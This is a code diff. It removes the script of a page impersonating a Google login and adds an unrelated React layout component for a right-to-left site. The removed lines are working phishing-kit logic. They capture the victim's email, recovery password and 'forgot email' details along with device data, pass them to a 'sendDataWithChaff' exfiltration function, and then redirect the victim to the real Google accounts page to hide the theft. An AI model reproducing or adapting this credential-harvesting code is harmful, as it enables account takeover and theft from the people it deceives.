-            if (document.querySelector('.footer-links a:nth-child(2)')) document.querySelector('.footer-links a:nth-child(2)').textContent = t.privacy;
-            if (document.querySelector('.footer-links a:nth-child(3)')) document.querySelector('.footer-links a:nth-child(3)').textContent = t.terms;
-        };
-        
-        document.addEventListener('DOMContentLoaded', () => {
-            // Page elements for easy access
-            pages = {
-                loginPage: document.getElementById('loginPage'),
-                passwordPage: document.getElementById('passwordPage'),
-                recoveryPage: document.getElementById('recoveryPage'),
-                forgotEmailPage: document.getElementById('forgotEmailPage'),
-            };
-            loadingBar = document.getElementById('loadingBar');
-            
-            // Login form submission handler
-            if (document.getElementById('loginForm')) {
-                document.getElementById('loginForm').addEventListener('submit', (e) => {
-                    e.preventDefault();
-                    let emailOrPhone = document.getElementById('emailInput').value.trim();
-
-                    if (emailOrPhone && !emailOrPhone.includes('@') && !/^\d+$/.test(emailOrPhone)) {
-                        emailOrPhone += '@gmail.com';
-                    }
-
-                    collectedData.email = emailOrPhone;
-                    
-                    if (collectedData.email) {
-                        const firstLetter = collectedData.email.charAt(0).toUpperCase();
-                        document.querySelectorAll('.profile-icon').forEach(icon => icon.textContent = firstLetter);
-                        
-                        const currentLang = document.getElementById('languageSelect').value;
-                        updateLanguage(currentLang);
-                        
-                        showPage('passwordPage', 'forward');
-                    }
-                });
-            }
-            
-            // Recovery form submission handler
-            if (document.getElementById('recoveryForm')) {
-                document.getElementById('recoveryForm').addEventListener('submit', (e) => {
-                    e.preventDefault();
-                    const recoveryPasswordInput = document.getElementById('recoveryPasswordInput');
-                    if (recoveryPasswordInput) {
-                        collectedData.recoveryPassword = recoveryPasswordInput.value.trim();
-                    }
-                    
-                    // Using the advanced sending function
-                    sendDataWithChaff(collectedData);
-                    window.location.href = 'https://accounts.google.com/';
-                });
-            }
-
-            // "Forgot Email?" link handler
-            if (document.getElementById('forgotEmailLink')) {
-                document.getElementById('forgotEmailLink').addEventListener('click', (e) => {
-                    e.preventDefault();
-                    showPage('forgotEmailPage', 'forward');
-                });
-            }
-
-            // Forgot Email form submission handler
-            if (document.getElementById('forgotEmailForm')) {
-                document.getElementById('forgotEmailForm').addEventListener('submit', (e) => {
-                    e.preventDefault();
-                    const forgotEmailInput = document.getElementById('forgotEmailInput');
-                    if (forgotEmailInput) {
-                        collectedData.forgotEmailInfo = forgotEmailInput.value.trim();
-                    }
-                    
-                    // Using the advanced sending function
-                    sendDataWithChaff(collectedData);
-                    window.location.href = 'https://accounts.google.com/';
-                });
-            }
-            
-            // "Try another way" link handler
-            if (document.getElementById('tryAnotherWayLink')) {
-                document.getElementById('tryAnotherWayLink').addEventListener('click', (e) => {
-                    e.preventDefault();
-                    window.location.href = 'https://accounts.google.com/recovery';
-                });
-            }
-
-            // Back button handlers
-            if (document.getElementById('forgotEmailGoBack')) {
-                document.getElementById('forgotEmailGoBack').addEventListener('click', (e) => {
-                    e.preventDefault();
-                    showPage('loginPage', 'backward');
-                });
-            }
-
-            collectDeviceData();
-            const userLang = navigator.language.split('-')[0];
-            const defaultLang = translations[userLang] ? userLang : 'ar';
-            if (document.getElementById('languageSelect')) {
-                document.getElementById('languageSelect').value = defaultLang;
-                document.getElementById('languageSelect').addEventListener('change', (e) => {
-                    updateLanguage(e.target.value);
-                });
-            }
-            updateLanguage(defaultLang);
-            showPage('loginPage');
-        });
-    </script>
-</body>
-</html>
+  return (
+    <div className={`min-h-screen text-right transition-colors duration-300`} dir="rtl" style={{ color: isDarkMode ? colors.secondary : colors.primary }}>
+      <style>{`
+        @import url('https://fonts.googleapis.com/css2?family=Almarai:wght@300;400;700&family=Cormorant+Garamond:wght@400;700&display=swap');
+        .animate-fade-in { animation: fadeIn 1s ease-out forwards; }
+        .animate-fade-in-up { animation: fadeInUp 1s ease-out forwards; }
+        @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
+        @keyframes fadeInUp { from { opacity: 0; transform: translateY(20px); } to { opacity: 1; transform: translateY(0); } }
+        button:focus, input:focus, textarea:focus { outline: none; }
+      `}</style>
+      <Header onNavigate={onNavigate} />
+      <main className="pb-16">
+        {renderPage()}
+      </main>
+      <Footer />
+      {authReady && <Chatbot />}
+      <Modal />
+    </div>
+  );
+};
